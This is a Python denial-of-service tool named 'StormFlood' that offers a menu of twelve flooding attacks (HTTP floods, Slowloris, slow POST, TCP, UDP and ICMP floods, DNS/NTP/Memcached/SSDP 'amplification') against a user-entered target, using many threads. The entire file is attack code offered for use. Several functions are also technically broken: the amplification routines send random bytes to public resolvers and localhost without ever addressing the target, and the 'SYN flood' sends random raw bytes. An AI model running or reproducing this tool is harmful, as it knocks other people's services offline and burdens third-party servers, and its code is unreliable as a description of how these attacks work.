import socket
import random
import os
import threading
import requests
import sys
import time
import http.client

# Clear console
os.system("clear" if os.name == "posix" else "cls")

banner = """
\033[1;31m   ____  _                              _____ _           _ 
  / ___|| |_ ___  _ __ ___   ___  _ __ | ___(_)_ __   __| |
  \___ \| __/ _ \\| '_ ` _ \\ / _ \\| '_ \\| |_  | | '_ \\ / _` |
   ___) | || (_) | | | | | | | (_) | | |  _| | | | | | (_| |
  |____/ \\__\\___/|_| |_| |_|\\___/|_| |_|_|   |_|_| |_|\\__,_|
\033[1;34m                     Author: creesoYT
\033[1;32m                     Program: StormFlood
"""

print(banner)

print("[1]: HTTP/HTTPS Flood")
print("[2]: HTTP/2 & HTTP/3 Flood")
print("[3]: Slowloris (Low & Slow)")
print("[4]: Slow POST / Slow Read")
print("[5]: TCP SYN Flood")
print("[6]: TCP ACK/FIN/RST Flood")
print("[7]: UDP Flood")
print("[8]: ICMP Flood / Ping of Death")
print("[9]: DNS Amplification")
print("[10]: NTP Amplification")
print("[11]: Memcached Amplification")
print("[12]: Chargen / SNMP / LDAP / SSDP Amplification")

choice = input("Select attack type [1-12]: ")
target_ip = input("Enter Target IP or URL: ")
target_port = 0
if choice in ["5","6","7"]:
    target_port = int(input("Enter Target Port (if applicable): "))

# Thread sayısı
threads = int(input("Enter number of threads (recommended 50-200): "))

# IPv4/IPv6 seçimi
ip_version = socket.AF_INET
if choice in ["1","2","3","4","5","6","7","8"]:
    print("[1]: IPv4")
    print("[2]: IPv6")
    ipver_choice = input("Select IP version [1/2]: ")
    if ipver_choice == "2":
        ip_version = socket.AF_INET6

# Data size input
data_size = 0
if choice in ["5","6","7"]:
    data_size = int(input("Enter Data Size to Send (in bytes): "))

# ----------------- Attack Functions -----------------

def http_https_flood():
    counter = 0
    while True:
        try:
            r = requests.get(target_ip)
            counter += 1
            if counter % 10 == 0:
                print(f"[HTTP/HTTPS] Requests Sent: {counter}, Status: {r.status_code}")
        except:
            pass

def http2_3_flood():
    counter = 0
    while True:
        try:
            conn = http.client.HTTPSConnection(target_ip)
            conn.request("GET","/")
            counter += 1
            if counter % 10 == 0:
                print(f"[HTTP/2&3] Requests Sent: {counter}")
            conn.close()
        except:
            pass

def slowloris():
    counter = 0
    while True:
        try:
            sock = socket.socket(ip_version, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target_ip, 80))
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(b"User-Agent: Mozilla/5.0\r\n")
            sock.send(b"Accept-language: en-US,en,q=0.5\r\n")
            counter += 1
            if counter % 5 == 0:
                print(f"[Slowloris] Partial Requests Sent: {counter}")
            time.sleep(15)
        except:
            pass

def slow_post_read():
    counter = 0
    while True:
        try:
            sock = socket.socket(ip_version, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target_ip, 80))
            sock.send(b"POST / HTTP/1.1\r\n")
            sock.send(b"User-Agent: Mozilla/5.0\r\n")
            sock.send(b"Content-Length: 100000\r\n\r\n")
            counter += 1
            if counter % 5 == 0:
                print(f"[Slow POST/Read] Partial Requests Sent: {counter}")
            time.sleep(15)
        except:
            pass

def tcp_syn_flood():
    counter = 0
    try:
        sock = socket.socket(ip_version, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except PermissionError:
        print("[TCP SYN] Run as root!")
        sys.exit(1)
    while True:
        try:
            sock.sendto(random._urandom(data_size), (target_ip,target_port))
            counter += 1
            if counter % 10 == 0:
                print(f"[TCP SYN] Packets Sent: {counter}")
        except:
            pass

def tcp_ack_fin_rst_flood():
    counter = 0
    while True:
        try:
            sock = socket.socket(ip_version, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.sendto(random._urandom(data_size), (target_ip,target_port))
            counter += 1
            if counter % 10 == 0:
                print(f"[TCP ACK/FIN/RST] Packets Sent: {counter}")
        except:
            pass

def udp_flood():
    sock = socket.socket(ip_version, socket.SOCK_DGRAM)
    data = random._urandom(data_size)
    counter = 0
    while True:
        try:
            sock.sendto(data, (target_ip,target_port))
            counter += 1
            if counter % 10 == 0:
                print(f"[UDP] Packets Sent: {counter}")
        except:
            pass

def icmp_flood():
    sock = socket.socket(ip_version, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    counter = 0
    while True:
        try:
            sock.sendto(random._urandom(64), (target_ip,0))
            counter += 1
            if counter % 10 == 0:
                print(f"[ICMP] Packets Sent: {counter}")
        except:
            pass

def dns_amplification():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    reflectors = ["8.8.8.8","1.1.1.1"]
    payload = random._urandom(1024)
    counter = 0
    while True:
        try:
            for r in reflectors:
                sock.sendto(payload,(r,53))
            counter += len(reflectors)
            if counter % 10 == 0:
                print(f"[DNS Amplification] Packets Sent: {counter}")
        except:
            pass

def ntp_amplification():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    reflectors = ["129.6.15.28"]
    payload = random._urandom(1024)
    counter = 0
    while True:
        try:
            for r in reflectors:
                sock.sendto(payload,(r,123))
            counter += len(reflectors)
            if counter % 10 == 0:
                print(f"[NTP Amplification] Packets Sent: {counter}")
        except:
            pass

def memcached_amplification():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    reflectors = ["127.0.0.1"]
    payload = random._urandom(1024)
    counter = 0
    while True:
        try:
            for r in reflectors:
                sock.sendto(payload,(r,11211))
            counter += len(reflectors)
            if counter % 10 == 0:
                print(f"[Memcached Amplification] Packets Sent: {counter}")
        except:
            pass

def chargen_snmp_ldap_ssdp_amplification():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    reflectors = ["8.8.8.8"]
    ports = [19,161,389,1900]
    payload = random._urandom(1024)
    counter = 0
    while True:
        try:
            for r in reflectors:
                for p in ports:
                    sock.sendto(payload,(r,p))
            counter += len(reflectors)*len(ports)
            if counter % 10 == 0:
                print(f"[Chargen/SNMP/LDAP/SSDP Amplification] Packets Sent: {counter}")
        except:
            pass

# ----------------- Start Threads -----------------

attack_dict = {
    "1": http_https_flood,
    "2": http2_3_flood,
    "3": slowloris,
    "4": slow_post_read,
    "5": tcp_syn_flood,
    "6": tcp_ack_fin_rst_flood,
    "7": udp_flood,
    "8": icmp_flood,
    "9": dns_amplification,
    "10": ntp_amplification,
    "11": memcached_amplification,
    "12": chargen_snmp_ldap_ssdp_amplification
}

for _ in range(threads):
    t = threading.Thread(target=attack_dict[choice])
    t.daemon = True
    t.start()

# Keep main thread alive
while True:
    time.sleep(0.1)
